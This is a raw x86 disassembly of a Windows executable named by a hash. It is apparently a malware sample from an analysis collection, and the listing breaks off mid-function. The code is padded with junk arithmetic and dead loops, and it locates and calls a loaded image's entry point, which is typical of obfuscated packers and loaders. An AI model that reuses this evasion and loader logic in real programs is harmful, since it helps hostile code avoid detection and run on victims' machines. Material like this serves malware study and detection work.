
af29c6d25d15e878eb406276fe695017491f079509bbf5b2434fe975e4574679.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xcc
  401009:	xor    DWORD PTR ds:0x422014,0x420f98
  401013:	push   edi
  401014:	sub    DWORD PTR ds:0x420fb0,0x420e8e
  40101e:	push   0x424545
  401023:	xor    edi,edi
  401025:	and    DWORD PTR ds:0x420efc,0x110f
  40102f:	inc    edi
  401030:	push   edi
  401031:	sbb    DWORD PTR ds:0x420f08,0x51
  40103b:	push   edi
  40103c:	adc    DWORD PTR ds:0x422000,0x3888
  401046:	call   DWORD PTR ds:0x4247ed
  40104c:	test   eax,eax
  40104e:	mov    DWORD PTR ds:0x420e8a,0x96
  401058:	je     0x40106f
  40105e:	xor    eax,eax
  401060:	mov    DWORD PTR ds:0x420ef0,0x42a7
  40106a:	jmp    0x4020ba
  40106f:	push   esi
  401070:	sbb    DWORD PTR ds:0x420e96,ebx
  401076:	mov    esi,DWORD PTR ds:0x4247e9
  40107c:	push   0x8
  40107e:	and    DWORD PTR ds:0x420e96,0x420ef4
  401088:	push   0x424565
  40108d:	sbb    DWORD PTR ds:0x420fa8,0x2663
  401097:	call   esi
  401099:	mov    DWORD PTR ds:0x420f58,0x2539
  4010a3:	test   eax,eax
  4010a5:	mov    DWORD PTR ds:0x420f74,0x63dd
  4010af:	jne    0x401117
  4010b5:	push   0xc
  4010b7:	adc    DWORD PTR ds:0x420efc,0x422010
  4010c1:	push   0x424579
  4010c6:	call   esi
  4010c8:	sbb    DWORD PTR ds:0x422000,0x6696
  4010d2:	test   eax,eax
  4010d4:	jne    0x401117
  4010da:	xor    DWORD PTR ds:0x422010,0x3be2
  4010e4:	push   0x42458d
  4010e9:	adc    DWORD PTR ds:0x420fac,0x420fa0
  4010f3:	push   edi
  4010f4:	push   edi
  4010f5:	call   DWORD PTR ds:0x424819
  4010fb:	add    DWORD PTR ds:0x420e7e,0x14dc
  401105:	test   eax,eax
  401107:	mov    DWORD PTR ds:0x420f08,0x3170
  401111:	je     0x401128
  401117:	xor    eax,eax
  401119:	mov    DWORD PTR ds:0x422014,0x5c19
  401123:	jmp    0x4020b9
  401128:	sbb    esi,DWORD PTR ds:0x420e9a
  40112e:	mov    DWORD PTR [ebp-0x10],0x0
  401135:	and    edi,0x6e17
  40113b:	mov    eax,DWORD PTR [ebp-0x24]
  40113e:	mov    DWORD PTR [ebp-0x24],eax
  401141:	sub    esi,DWORD PTR ds:0x420fa0
  401147:	mov    ecx,0xf89c85b5
  40114c:	mov    DWORD PTR [ebp-0x8],ecx
  40114f:	sub    esi,DWORD PTR ds:0x420f00
  401155:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  40115c:	sbb    edx,DWORD PTR ds:0x420e92
  401162:	lea    eax,[ebp-0x38]
  401165:	mov    DWORD PTR [ebp-0x2c],eax
  401168:	adc    DWORD PTR ds:0x420f74,edi
  40116e:	lea    eax,[ebp-0x30]
  401171:	xor    esi,esi
  401173:	or     esi,DWORD PTR ds:0x420e9a
  401179:	and    DWORD PTR ds:0x420f64,esi
  40117f:	mov    DWORD PTR [ebp-0x1c],eax
  401182:	sbb    esi,eax
  401184:	mov    eax,ds:0x424435
  401189:	mov    edi,DWORD PTR ds:0x420f48
  40118f:	mov    edx,DWORD PTR ds:0x420f84
  401195:	sub    edx,edi
  401197:	sub    edi,DWORD PTR [edi+edx*1]
  40119a:	mov    eax,DWORD PTR [eax+0x1c8]
  4011a0:	mov    eax,DWORD PTR [eax]
  4011a2:	mov    edx,DWORD PTR [ebp-0x1c]
  4011a5:	movzx  edi,BYTE PTR ds:0x420fb4
  4011ac:	add    DWORD PTR ds:0x420e8a,edi
  4011b2:	mov    esi,0x7510896
  4011b7:	xor    eax,esi
  4011b9:	and    DWORD PTR ds:0x420fa0,0x420e96
  4011c3:	mov    edi,0x3272dd
  4011c8:	add    eax,edi
  4011ca:	mov    DWORD PTR [edx],eax
  4011cc:	mov    DWORD PTR ds:0x420ea2,0x7e11
  4011d6:	mov    eax,ds:0x424675
  4011db:	cmp    eax,0x312bc9f6
  4011e0:	mov    DWORD PTR ds:0x420fa4,0x3707
  4011ea:	jne    0x40133f
  4011f0:	mov    eax,DWORD PTR [ebp-0x8]
  4011f3:	mov    edx,DWORD PTR ds:0x424435
  4011f9:	mov    edx,DWORD PTR [edx+0x198]
  4011ff:	xor    eax,esi
  401201:	add    eax,edi
  401203:	add    DWORD PTR ds:0x422010,0x420eec
  40120d:	mov    DWORD PTR [edx],eax
  40120f:	and    DWORD PTR ds:0x42200c,0x0
  401219:	jmp    0x40122d
  40121e:	xor    edx,edx
  401220:	add    edx,DWORD PTR ds:0x42200c
  401226:	inc    edx
  401227:	mov    DWORD PTR ds:0x42200c,edx
  40122d:	cmp    DWORD PTR ds:0x42200c,0x12
  401234:	jae    0x401276
  40123a:	cmp    DWORD PTR ds:0x42200c,0x5
  401241:	jne    0x401255
  401247:	push   DWORD PTR [ebp-0x18]
  40124a:	push   0x450b
  40124f:	call   DWORD PTR ds:0x4247d5
  401255:	cmp    DWORD PTR ds:0x42200c,0x4
  40125c:	jne    0x401271
  401262:	xor    edx,edx
  401264:	add    edx,DWORD PTR ds:0x42200c
  40126a:	inc    edx
  40126b:	mov    DWORD PTR ds:0x42200c,edx
  401271:	jmp    0x40121e
  401276:	mov    eax,DWORD PTR [ebp-0x8]
  401279:	and    DWORD PTR ds:0x420f70,0x0
  401283:	mov    edx,DWORD PTR ds:0x420f70
  401289:	inc    edx
  40128a:	mov    DWORD PTR ds:0x420f70,edx
  401290:	cmp    DWORD PTR ds:0x420f70,0x7
  401297:	jne    0x4012b0
  40129d:	push   0x5d66
  4012a2:	push   0x420f60
  4012a7:	push   DWORD PTR [ebp-0x14]
  4012aa:	call   DWORD PTR ds:0x4247d9
  4012b0:	cmp    DWORD PTR ds:0x420f70,0x6
  4012b7:	jne    0x4012ca
  4012bd:	mov    edx,DWORD PTR ds:0x420f70
  4012c3:	inc    edx
  4012c4:	mov    DWORD PTR ds:0x420f70,edx
  4012ca:	cmp    DWORD PTR ds:0x420f70,0x14
  4012d1:	jb     0x401283
  4012d7:	and    edx,0x4d07
  4012dd:	xor    eax,esi
  4012df:	movzx  edx,BYTE PTR ds:0x420f08
  4012e6:	sub    edx,DWORD PTR ds:0x420fa0
  4012ec:	mov    DWORD PTR ds:0x420f08,edx
  4012f2:	add    eax,edi
  4012f4:	mov    DWORD PTR ds:0x422008,0x18
  4012fe:	cmp    DWORD PTR ds:0x422008,0x0
  401305:	je     0x40133a
  40130b:	cmp    DWORD PTR ds:0x422008,0x1d
  401312:	jne    0x401328
  401318:	push   0x42406a
  40131d:	push   0x424044
  401322:	call   DWORD PTR ds:0x4247dd
  401328:	mov    edx,DWORD PTR ds:0x422008
  40132e:	dec    edx
  40132f:	mov    DWORD PTR ds:0x422008,edx
  401335:	jmp    0x4012fe
  40133a:	mov    ds:0x424675,eax
  40133f:	mov    eax,ds:0x424435
  401344:	and    DWORD PTR ds:0x420ef4,0x0
  40134e:	mov    edx,DWORD PTR ds:0x420ef4
  401354:	inc    edx
  401355:	mov    DWORD PTR ds:0x420ef4,edx
  40135b:	cmp    DWORD PTR ds:0x420ef4,0x20
  401362:	jne    0x401379
  401368:	push   DWORD PTR [ebp-0x18]
  40136b:	push   0x222d
  401370:	push   DWORD PTR [ebp-0x28]
  401373:	call   DWORD PTR ds:0x4247e1
  401379:	cmp    DWORD PTR ds:0x420ef4,0x12
  401380:	jb     0x40134e
  401386:	mov    eax,DWORD PTR [eax+0x18c]
  40138c:	mov    eax,DWORD PTR [eax]
  40138e:	adc    DWORD PTR ds:0x422014,0x7308
  401398:	mov    DWORD PTR [ebp-0x68],eax
  40139b:	and    DWORD PTR ds:0x420e7e,0x0
  4013a5:	xor    eax,eax
  4013a7:	or     eax,DWORD PTR ds:0x420e7e
  4013ad:	inc    eax
  4013ae:	mov    ds:0x420e7e,eax
  4013b3:	cmp    DWORD PTR ds:0x420e7e,0xa
  4013ba:	jne    0x4013d1
  4013c0:	push   DWORD PTR [ebp-0x20]
  4013c3:	push   0x420f74
  4013c8:	push   DWORD PTR [ebp-0x28]
  4013cb:	call   DWORD PTR ds:0x4247e5
  4013d1:	cmp    DWORD PTR ds:0x420e7e,0x9
  4013d8:	jne    0x4013ec
  4013de:	xor    eax,eax
  4013e0:	xor    eax,DWORD PTR ds:0x420e7e
  4013e6:	inc    eax
  4013e7:	mov    ds:0x420e7e,eax
  4013ec:	cmp    DWORD PTR ds:0x420e7e,0x14
  4013f3:	jb     0x4013a5
  4013f9:	mov    DWORD PTR ds:0x420f04,0x16
  401403:	cmp    DWORD PTR ds:0x420f04,0x0
  40140a:	je     0x401438
  401410:	cmp    DWORD PTR ds:0x420f04,0x22
  401417:	jne    0x401423
  40141d:	call   DWORD PTR ds:0x4247f1
  401423:	xor    eax,eax
  401425:	or     eax,DWORD PTR ds:0x420f04
  40142b:	dec    eax
  40142c:	mov    ds:0x420f04,eax
  401431:	jmp    0x401403
  401436:	sub    edx,edx
  401438:	push   ebx
  401439:	or     eax,DWORD PTR ds:0x420f00
  40143f:	mov    ebx,0xf89c85b1
  401444:	and    DWORD PTR ds:0x420fa0,0x0
  40144e:	mov    edx,DWORD PTR ds:0x420fa0
  401454:	inc    edx
  401455:	mov    DWORD PTR ds:0x420fa0,edx
  40145b:	cmp    DWORD PTR ds:0x420fa0,0x8
  401462:	jne    0x40146e
  401468:	call   DWORD PTR ds:0x4247f5
  40146e:	cmp    DWORD PTR ds:0x420fa0,0x7
  401475:	jne    0x40148a
  40147b:	xor    edx,edx
  40147d:	xor    edx,DWORD PTR ds:0x420fa0
  401483:	inc    edx
  401484:	mov    DWORD PTR ds:0x420fa0,edx
  40148a:	cmp    DWORD PTR ds:0x420fa0,0x1e
  401491:	jb     0x40144e
  401497:	and    DWORD PTR ds:0x420e7a,0x0
  4014a1:	jmp    0x4014b3
  4014a6:	mov    edx,DWORD PTR ds:0x420e7a
  4014ac:	inc    edx
  4014ad:	mov    DWORD PTR ds:0x420e7a,edx
  4014b3:	cmp    DWORD PTR ds:0x420e7a,0x14
  4014ba:	jae    0x4014ff
  4014c0:	cmp    DWORD PTR ds:0x420e7a,0x1f
  4014c7:	jne    0x4014f0
  4014cd:	push   0x20c6
  4014d2:	push   DWORD PTR [ebp-0x10]
  4014d5:	push   0x420ea2
  4014da:	push   0x440c
  4014df:	push   DWORD PTR [ebp-0x20]
  4014e2:	push   0x7f92
  4014e7:	push   DWORD PTR [ebp-0x20]
  4014ea:	call   DWORD PTR ds:0x4247f9
  4014f0:	jmp    0x4014a6
  4014f5:	adc    DWORD PTR ds:0x420ea2,0x7cfc
  4014ff:	mov    DWORD PTR [ebp-0x10],ebx
  401502:	sub    DWORD PTR ds:0x420f5c,edi
  401508:	mov    DWORD PTR [ebp-0x10],ebx
  40150b:	mov    DWORD PTR ds:0x420f04,0x12
  401515:	cmp    DWORD PTR ds:0x420f04,0x0
  40151c:	je     0x40156b
  401522:	cmp    DWORD PTR ds:0x420f04,0x5
  401529:	jne    0x40153d
  40152f:	push   DWORD PTR [ebp-0x1c]
  401532:	push   0x424044
  401537:	call   DWORD PTR ds:0x4247fd
  40153d:	cmp    DWORD PTR ds:0x420f04,0x6
  401544:	jne    0x401557
  40154a:	mov    edx,DWORD PTR ds:0x420f04
  401550:	dec    edx
  401551:	mov    DWORD PTR ds:0x420f04,edx
  401557:	xor    edx,edx
  401559:	or     edx,DWORD PTR ds:0x420f04
  40155f:	dec    edx
  401560:	mov    DWORD PTR ds:0x420f04,edx
  401566:	jmp    0x401515
  40156b:	mov    DWORD PTR [ebp-0x10],ebx
  40156e:	and    DWORD PTR ds:0x422004,0x0
  401578:	jmp    0x40158c
  40157d:	xor    edx,edx
  40157f:	xor    edx,DWORD PTR ds:0x422004
  401585:	inc    edx
  401586:	mov    DWORD PTR ds:0x422004,edx
  40158c:	cmp    DWORD PTR ds:0x422004,0x12
  401593:	jae    0x4015bd
  401599:	cmp    DWORD PTR ds:0x422004,0x1e
  4015a0:	jne    0x4015b8
  4015a6:	push   0x424168
  4015ab:	push   0x1
  4015ad:	push   0x0
  4015af:	push   DWORD PTR [ebp-0x14]
  4015b2:	call   DWORD PTR ds:0x424801
  4015b8:	jmp    0x40157d
  4015bd:	mov    DWORD PTR [ebp-0x1c],ecx
  4015c0:	xor    edx,edx
  4015c2:	mov    DWORD PTR [ebp-0x10],ebx
  4015c5:	mov    DWORD PTR ds:0x420e96,0xb45
  4015cf:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  4015d6:	and    DWORD PTR ds:0x422014,0x2ed5
  4015e0:	mov    eax,DWORD PTR [ebp-0x8]
  4015e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4015e6:	xor    edx,edx
  4015e8:	or     edx,DWORD PTR ds:0x420f60
  4015ee:	and    DWORD PTR ds:0x422000,edx
  4015f4:	mov    edx,DWORD PTR [ebp-0xc]
  4015f7:	sbb    DWORD PTR ds:0x420fa0,0x420fb4
  401601:	xor    edx,esi
  401603:	and    DWORD PTR ds:0x420f5c,0x420fa4
  40160d:	xor    ecx,esi
  40160f:	sub    DWORD PTR ds:0x422008,0x420f58
  401619:	add    ecx,edx
  40161b:	sbb    DWORD PTR ds:0x420e8e,edi
  401621:	mov    edx,DWORD PTR [ebp-0xc]
  401624:	xor    DWORD PTR ds:0x420f00,0x7b1e
  40162e:	xor    eax,esi
  401630:	xor    edx,esi
  401632:	or     DWORD PTR ds:0x420e9a,0x7d42
  40163c:	add    eax,edi
  40163e:	lea    ecx,[ecx+edx*1+0x975897]
  401645:	not    DWORD PTR ds:0x420f70
  40164b:	mov    DWORD PTR [ebp-0x18],eax
  40164e:	mov    DWORD PTR ds:0x420e7e,0x57b9
  401658:	cmp    eax,ecx
  40165a:	ja     0x40177e
  401660:	jmp    0x401678
  401665:	mov    eax,ds:0x420f30
  40166a:	mov    ecx,DWORD PTR ds:0x420f38
  401670:	sub    ecx,eax
  401672:	and    eax,DWORD PTR [eax+ecx*1]
  401675:	mov    eax,DWORD PTR [ebp-0x18]
  401678:	mov    ecx,DWORD PTR [ebp-0xc]
  40167b:	sub    DWORD PTR ds:0x422010,0x420f70
  401685:	xor    ecx,esi
  401687:	lea    eax,[ecx+eax*1+0x3272dd]
  40168e:	or     DWORD PTR ds:0x420f70,0x48c8
  401698:	push   eax
  401699:	sub    DWORD PTR ds:0x420e9e,0x506d
  4016a3:	mov    eax,DWORD PTR [ebp-0x1c]
  4016a6:	and    DWORD PTR ds:0x420f5c,0x3822
  4016b0:	xor    eax,esi
  4016b2:	xor    DWORD PTR ds:0x420f74,0x420ef0
  4016bc:	lea    eax,[ebp+eax*1+0x3272e5]
  4016c3:	or     DWORD PTR ds:0x420ea2,0x420f60
  4016cd:	push   eax
  4016ce:	or     DWORD PTR ds:0x420f00,0x5827
  4016d8:	mov    eax,ds:0x424435
  4016dd:	and    DWORD PTR ds:0x420fb4,0x420fa4
  4016e7:	push   DWORD PTR [eax+0x1bc]
  4016ed:	xor    DWORD PTR ds:0x420f98,0x420ea2
  4016f7:	call   0x4020cd
  4016fc:	add    DWORD PTR ds:0x420f68,0x6b04
  401706:	mov    eax,DWORD PTR [ebp-0xc]
  401709:	or     edx,DWORD PTR ds:0x420ef0
  40170f:	mov    ecx,DWORD PTR [ebp-0x18]
  401712:	neg    edx
  401714:	xor    eax,esi
  401716:	sub    edx,0x4f8d
  40171c:	lea    eax,[ecx+eax*1+0x3272dd]
  401723:	mov    ecx,DWORD PTR [ebp-0xc]
  401726:	xor    edx,DWORD PTR ds:0x420e7a
  40172c:	mov    edx,DWORD PTR [ebp-0xc]
  40172f:	xor    edx,esi
  401731:	add    DWORD PTR ds:0x420ef4,0x420e9e
  40173b:	xor    ecx,esi
  40173d:	adc    DWORD PTR ds:0x420e82,0x420f5c
  401747:	add    ecx,edx
  401749:	mov    edx,DWORD PTR [ebp-0xc]
  40174c:	xor    edx,esi
  40174e:	lea    ecx,[ecx+edx*1+0x975897]
  401755:	mov    DWORD PTR ds:0x420e82,0x59f5
  40175f:	mov    DWORD PTR [ebp-0x18],eax
  401762:	mov    DWORD PTR ds:0x420f98,0x3280
  40176c:	cmp    eax,ecx
  40176e:	mov    DWORD PTR ds:0x420fb4,0x7b83
  401778:	jbe    0x401665
  40177e:	and    DWORD PTR ds:0x420f98,0x0
  401788:	mov    ecx,DWORD PTR ds:0x420f98
  40178e:	inc    ecx
  40178f:	mov    DWORD PTR ds:0x420f98,ecx
  401795:	cmp    DWORD PTR ds:0x420f98,0x1e
  40179c:	jne    0x4017b2
  4017a2:	push   0x420fa0
  4017a7:	push   0x4d18
  4017ac:	call   DWORD PTR ds:0x424805
  4017b2:	cmp    DWORD PTR ds:0x420f98,0x18
  4017b9:	jb     0x401788
  4017bf:	mov    eax,DWORD PTR [ebp+0xc]
  4017c2:	sbb    DWORD PTR ds:0x420e7a,edx
  4017c8:	mov    ds:0x4242b9,eax
  4017cd:	and    DWORD PTR ds:0x420f74,0x0
  4017d7:	mov    eax,ds:0x420f74
  4017dc:	inc    eax
  4017dd:	mov    ds:0x420f74,eax
  4017e2:	cmp    DWORD PTR ds:0x420f74,0x1b
  4017e9:	jne    0x40180f
  4017ef:	push   DWORD PTR [ebp-0x1c]
  4017f2:	push   0x420f9c
  4017f7:	push   0x46e8
  4017fc:	push   0x4240e4
  401801:	push   0x1c79
  401806:	push   DWORD PTR [ebp-0xc]
  401809:	call   DWORD PTR ds:0x42480d
  40180f:	cmp    DWORD PTR ds:0x420f74,0x12
  401816:	jb     0x4017d7
  40181c:	mov    eax,DWORD PTR [ebp+0x10]
  40181f:	sub    ecx,DWORD PTR ds:0x420fa4
  401825:	mov    ds:0x42450d,eax
  40182a:	and    DWORD PTR ds:0x422010,0x0
  401834:	mov    eax,ds:0x422010
  401839:	inc    eax
  40183a:	mov    ds:0x422010,eax
  40183f:	cmp    DWORD PTR ds:0x422010,0x18
  401846:	jne    0x401852
  40184c:	call   DWORD PTR ds:0x424811
  401852:	cmp    DWORD PTR ds:0x422010,0x17
  401859:	jb     0x401834
  40185f:	add    ecx,ecx
  401861:	mov    eax,ds:0x4242b9
  401866:	or     DWORD PTR ds:0x420e7a,0x2e1b
  401870:	mov    ecx,DWORD PTR [ebp-0x2c]
  401873:	sub    eax,edi
  401875:	neg    DWORD PTR ds:0x420e92
  40187b:	xor    eax,esi
  40187d:	mov    DWORD PTR ds:0x420fac,0x2c59
  401887:	mov    DWORD PTR [ecx],eax
  401889:	mov    ecx,DWORD PTR [ebp-0x24]
  40188c:	mov    DWORD PTR ds:0x420efc,0x2f09
  401896:	mov    eax,0xf89c85b5
  40189b:	mov    DWORD PTR ds:0x420efc,0x2084
  4018a5:	cmp    ecx,eax
  4018a7:	jne    0x401be5
  4018ad:	xor    DWORD PTR ds:0x422014,0x4966
  4018b7:	lea    eax,[ebp-0x34]
  4018ba:	adc    DWORD PTR ds:0x420e8a,0x420e92
  4018c4:	mov    DWORD PTR [ebp-0x70],eax
  4018c7:	xor    DWORD PTR ds:0x420f74,0x422004
  4018d1:	lea    eax,[ebp+0x4]
  4018d4:	sub    DWORD PTR ds:0x420fa4,0x42200c
  4018de:	mov    DWORD PTR [ebp-0x34],eax
  4018e1:	mov    eax,DWORD PTR [ebp-0x34]
  4018e4:	test   eax,eax
  4018e6:	mov    DWORD PTR ds:0x420e82,0x6242
  4018f0:	je     0x40209d
  4018f6:	xor    DWORD PTR ds:0x422008,0x2d73
  401900:	mov    eax,DWORD PTR [ebp-0x20]
  401903:	mov    eax,DWORD PTR [ebp-0xc]
  401906:	mov    eax,DWORD PTR [ebp-0x8]
  401909:	adc    ecx,0x7834
  40190f:	mov    DWORD PTR [ebp+0xc],eax
  401912:	not    ecx
  401914:	mov    eax,eax
  401916:	mov    eax,ds:0x424435
  40191b:	and    DWORD PTR ds:0x422008,0x0
  401925:	mov    ecx,DWORD PTR ds:0x422008
  40192b:	inc    ecx
  40192c:	mov    DWORD PTR ds:0x422008,ecx
  401932:	cmp    DWORD PTR ds:0x422008,0x1e
  401939:	jne    0x40194a
  40193f:	push   0x422000
  401944:	call   DWORD PTR ds:0x424815
  40194a:	cmp    DWORD PTR ds:0x422008,0x1d
  401951:	jb     0x401925
  401957:	and    DWORD PTR ds:0x420fa0,0x0
  401961:	jmp    0x401973
  401966:	mov    ecx,DWORD PTR ds:0x420fa0
  40196c:	inc    ecx
  40196d:	mov    DWORD PTR ds:0x420fa0,ecx
  401973:	cmp    DWORD PTR ds:0x420fa0,0x14
  40197a:	jae    0x4019bc
  401980:	cmp    DWORD PTR ds:0x420fa0,0x5
  401987:	jne    0x40199d
  40198d:	push   0x2f20
  401992:	push   0x8e83
  401997:	call   DWORD PTR ds:0x4247d5
  40199d:	cmp    DWORD PTR ds:0x420fa0,0x4
  4019a4:	jne    0x4019b7
  4019aa:	mov    ecx,DWORD PTR ds:0x420fa0
  4019b0:	inc    ecx
  4019b1:	mov    DWORD PTR ds:0x420fa0,ecx
  4019b7:	jmp    0x401966
  4019bc:	mov    eax,DWORD PTR [eax+0x1c8]
  4019c2:	neg    DWORD PTR ds:0x420f98
  4019c8:	mov    eax,DWORD PTR [eax]
  4019ca:	sbb    DWORD PTR ds:0x420f74,ebx
  4019d0:	cdq    
  4019d1:	adc    DWORD PTR ds:0x42200c,0x4213
  4019db:	mov    ebx,eax
  4019dd:	mov    DWORD PTR ds:0x420fa4,0x17
  4019e7:	cmp    DWORD PTR ds:0x420fa4,0x0
  4019ee:	je     0x401a74
  4019f4:	cmp    DWORD PTR ds:0x420fa4,0x20
  4019fb:	jne    0x401a14
  401a01:	push   DWORD PTR [ebp-0x1c]
  401a04:	push   0x420e9a
  401a09:	push   0x6482
  401a0e:	call   DWORD PTR ds:0x4247d9
  401a14:	xor    eax,eax
  401a16:	or     eax,DWORD PTR ds:0x420fa4
  401a1c:	dec    eax
  401a1d:	mov    ds:0x420fa4,eax
  401a22:	jmp    0x4019e7
  401a27:	mov    DWORD PTR ds:0x420f08,0x1d
  401a31:	cmp    DWORD PTR ds:0x420f08,0x0
  401a38:	je     0x401a74
  401a3e:	cmp    DWORD PTR ds:0x420f08,0x1e
  401a45:	jne    0x401a5b
  401a4b:	push   0x424027
  401a50:	push   0x4240af
  401a55:	call   DWORD PTR ds:0x4247dd
  401a5b:	xor    eax,eax
  401a5d:	xor    eax,DWORD PTR ds:0x420f08
  401a63:	dec    eax
  401a64:	mov    ds:0x420f08,eax
  401a69:	jmp    0x401a31
  401a6e:	and    DWORD PTR ds:0x420e82,ebx
  401a74:	mov    eax,0xfabdbeed
  401a79:	add    ebx,eax
  401a7b:	inc    ecx
  401a7c:	adc    edx,0xffffffff
  401a7f:	mov    DWORD PTR ds:0x420fa0,0x16
  401a89:	cmp    DWORD PTR ds:0x420fa0,0x0
  401a90:	je     0x401b11
  401a96:	cmp    DWORD PTR ds:0x420fa0,0x20
  401a9d:	jne    0x401ab4
  401aa3:	push   DWORD PTR [ebp-0x10]
  401aa6:	push   0x1d23
  401aab:	push   DWORD PTR [ebp-0x1c]
  401aae:	call   DWORD PTR ds:0x4247e1
  401ab4:	xor    ecx,ecx
  401ab6:	xor    ecx,DWORD PTR ds:0x420fa0
  401abc:	dec    ecx
  401abd:	mov    DWORD PTR ds:0x420fa0,ecx
  401ac3:	jmp    0x401a89
  401ac8:	mov    DWORD PTR ds:0x42200c,0x1c
  401ad2:	cmp    DWORD PTR ds:0x42200c,0x0
  401ad9:	je     0x401b11
  401adf:	cmp    DWORD PTR ds:0x42200c,0x2c
  401ae6:	jne    0x401aff
  401aec:	push   0x87f3
  401af1:	push   0x420f68
  401af6:	push   DWORD PTR [ebp-0xc]
  401af9:	call   DWORD PTR ds:0x4247e5
  401aff:	mov    ecx,DWORD PTR ds:0x42200c
  401b05:	dec    ecx
  401b06:	mov    DWORD PTR ds:0x42200c,ecx
  401b0c:	jmp    0x401ad2
  401b11:	and    DWORD PTR [ebp-0x10],0x0
  401b15:	sbb    DWORD PTR ds:0x422014,ebx
  401b1b:	xor    edx,0x0
  401b1e:	xor    ecx,DWORD PTR ds:0x420f70
  401b24:	mov    DWORD PTR [ebp-0x54],edx
  401b27:	adc    ecx,edx
  401b29:	mov    edx,DWORD PTR [ebp+0xc]
  401b2c:	mov    DWORD PTR [ebp-0x14],edx
  401b2f:	mov    ecx,0x8a29a127
  401b34:	xor    ebx,ecx
  401b36:	dec    edx
  401b37:	add    DWORD PTR [ebp-0x14],eax
  401b3a:	mov    DWORD PTR ds:0x420e96,edi
  401b40:	mov    edx,DWORD PTR [ebp-0x14]
  401b43:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401b47:	or     DWORD PTR ds:0x420f6c,0x420f00
  401b51:	xor    edx,ecx
  401b53:	add    DWORD PTR ds:0x420e86,0x420f04
  401b5d:	mov    DWORD PTR [ebp-0x4c],edx
  401b60:	mov    edx,DWORD PTR [ebp-0x10]
  401b63:	xor    edx,0x0
  401b66:	mov    DWORD PTR [ebp-0x48],edx
  401b69:	mov    DWORD PTR ds:0x420efc,0x3c82
  401b73:	cmp    DWORD PTR [ebp-0x4c],ebx
  401b76:	jne    0x401b92
  401b7c:	mov    DWORD PTR ds:0x420e92,0x5ff4
  401b86:	mov    edx,DWORD PTR [ebp-0x54]
  401b89:	cmp    DWORD PTR [ebp-0x48],edx
  401b8c:	je     0x401bc1
  401b92:	mov    edx,DWORD PTR ds:0x424435
  401b98:	mov    edx,DWORD PTR [edx+0x1c0]
  401b9e:	mov    edx,DWORD PTR [edx]
  401ba0:	xor    ebx,ebx
  401ba2:	add    edx,eax
  401ba4:	adc    ebx,0xffffffff
  401ba7:	xor    edx,ecx
  401ba9:	xor    ebx,0x0
  401bac:	cmp    edx,0x70941fc9
  401bb2:	jne    0x40209d
  401bb8:	cmp    ebx,0xffffffff
  401bbb:	jne    0x40209d
  401bc1:	mov    edx,DWORD PTR ds:0x4244b1
  401bc7:	mov    ebx,DWORD PTR ds:0x4244b9
  401bcd:	xor    edx,ebx
  401bcf:	mov    DWORD PTR ds:0x4244b1,edx
  401bd5:	mov    ebx,DWORD PTR ds:0x4244b1
  401bdb:	mov    edx,DWORD PTR [ebp-0x34]
  401bde:	add    DWORD PTR [edx],ebx
  401be0:	jmp    0x40205e
  401be5:	mov    ecx,DWORD PTR [ebp-0x38]
  401be8:	cmp    ecx,0xf89c85b2
  401bee:	je     0x401c4b
  401bf4:	mov    ecx,DWORD PTR [ebp-0x8]
  401bf7:	mov    edx,DWORD PTR [ebp-0x30]
  401bfa:	xor    ecx,esi
  401bfc:	add    ecx,edi
  401bfe:	cmp    ecx,edx
  401c00:	je     0x401c4b
  401c06:	mov    eax,ds:0x424435
  401c0b:	mov    eax,DWORD PTR [eax+0x194]
  401c11:	mov    ecx,DWORD PTR [eax]
  401c13:	mov    eax,DWORD PTR [ecx+0x3c]
  401c16:	push   DWORD PTR ds:0x42450d
  401c1c:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401c20:	push   DWORD PTR ds:0x4242b9
  401c26:	add    eax,ecx
  401c28:	mov    ecx,DWORD PTR ds:0x424435
  401c2e:	mov    ecx,DWORD PTR [ecx+0x194]
  401c34:	push   DWORD PTR [ecx]
  401c36:	call   eax
  401c38:	mov    ecx,DWORD PTR ds:0x424435
  401c3e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401c44:	mov    DWORD PTR [ecx],eax
  401c46:	jmp    0x40209d
  401c4b:	mov    ecx,DWORD PTR [ebp-0x8]
  401c4e:	mov    edx,DWORD PTR [ebp-0x68]
  401c51:	xor    ecx,esi
  401c53:	add    ecx,edi
  401c55:	cmp    ecx,edx
  401c57:	jne    0x401f61
  401c5d:	mov    ecx,DWORD PTR [ebp-0x8]
  401c60:	mov    edx,DWORD PTR ds:0x424435
  401c66:	mov    edx,DWORD PTR [edx+0x198]
  401c6c:	xor    ecx,esi
  401c6e:	add    ecx,edi
  401c70:	cmp    ecx,DWORD PTR [edx]
  401c72:	jne    0x401c8d
  401c78:	push   eax
  401c79:	mov    eax,DWORD PTR [ebp-0x8]
  401c7c:	xor    eax,esi
  401c7e:	add    eax,edi
  401c80:	push   eax
  401c81:	push   ebx
  401c82:	push   DWORD PTR [ebp-0xc]
  401c85:	push   DWORD PTR [ebp-0x8]
  401c88:	call   0x40772b
  401c8d:	mov    eax,DWORD PTR [ebp-0xc]
  401c90:	mov    DWORD PTR [ebp-0x3c],eax
  401c93:	mov    eax,DWORD PTR [ebp-0x8]
  401c96:	mov    DWORD PTR [ebp-0x18],eax
  401c99:	mov    eax,DWORD PTR [ebp-0x18]
  401c9c:	xor    eax,esi
  401c9e:	add    eax,edi
  401ca0:	mov    DWORD PTR [ebp+0x10],eax
  401ca3:	mov    eax,ds:0x4242b5
  401ca8:	mov    eax,DWORD PTR [eax]
  401caa:	mov    DWORD PTR [ebp+0x10],eax
  401cad:	mov    eax,ds:0x4244bd
  401cb2:	mov    eax,DWORD PTR [eax]
  401cb4:	mov    DWORD PTR [ebp-0x1c],eax
  401cb7:	mov    DWORD PTR [ebp+0xc],0xf89c87b5
  401cbe:	mov    eax,DWORD PTR [ebp+0xc]
  401cc1:	xor    eax,esi
  401cc3:	add    eax,edi
  401cc5:	mov    DWORD PTR [ebp+0xc],eax
  401cc8:	mov    eax,ds:0x424435
  401ccd:	mov    DWORD PTR [ebp+0xc],eax
  401cd0:	mov    eax,DWORD PTR [ebp+0x10]
  401cd3:	mov    DWORD PTR [ebp+0xc],eax
  401cd6:	mov    eax,DWORD PTR [ebp+0xc]
  401cd9:	push   0x4
